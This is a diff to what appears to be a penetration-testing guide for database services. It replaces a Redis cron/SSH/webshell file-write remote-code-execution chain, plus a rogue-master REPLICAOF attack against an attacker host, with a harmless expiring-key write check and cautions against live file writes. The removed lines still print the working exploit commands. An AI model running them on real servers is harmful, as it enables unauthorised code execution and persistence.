@@ -34,16 +34,19 @@ redis-cli -h <host> CONFIG GET dir
 redis-cli -h <host> CONFIG GET dbfilename
 ```
 
-**File write -> RCE** (runs as the Redis user, often root in containers):
+**Safe write-access validation:**
 
 ```
-redis-cli -h <host> CONFIG SET dir /var/spool/cron/crontabs
-redis-cli -h <host> CONFIG SET dbfilename root
-redis-cli -h <host> SET x "\n* * * * * <command>\n"
-redis-cli -h <host> SAVE
+redis-cli -h <host> SET strix_validation_marker proof EX 60
+redis-cli -h <host> GET strix_validation_marker
+redis-cli -h <host> DEL strix_validation_marker
 ```
 
-Alternatives: `~/.ssh/authorized_keys` (SSH key), web root webshell, `/etc/cron.d/`. **Master-replica**: `REPLICAOF <attacker> 6379` against a rogue Redis master can push arbitrary commands/file content (works when `SLAVEOF`/`REPLICAOF` not renamed). Lua `EVAL` executes server-side code but is sandboxed.
+This proves write access while expiring and removing the test key. Do not change
+`dir`/`dbfilename`, call `SAVE`, install cron or SSH payloads, or write webroots on
+live targets. Those file-write paths can be documented as theoretical impact and
+validated only in an isolated lab. **Master-replica** abuse and Lua `EVAL` should
+likewise be version-gated and tested only in a disposable environment.
 
 ### MongoDB (27017)
 
@@ -172,7 +175,7 @@ Default `neo4j/neo4j`; browser console at `http://<host>:7474/browser/`; Bolt on
 ## Pro Tips
 
 1. Enumerate the catalog before sampling data - it proves scope and keeps the footprint small
-2. Redis `CONFIG GET dir` + `SAVE` is the classic container RCE; check the Redis user/OS before firing file writes
+2. Redis `CONFIG GET dir` reveals the classic container RCE path; keep file-write validation to disposable labs and use the expiring marker-key proof on live targets
 3. Look for session/credential material first - it is often the highest-value data in caches
 4. Version-gate the historical CVEs (CouchDB 1.x/2.x, ES script engine, log4j)
 5. Pair with `ssrf`, `nosql_injection`, `weak_password_detection`, and the cloud skills for pivots
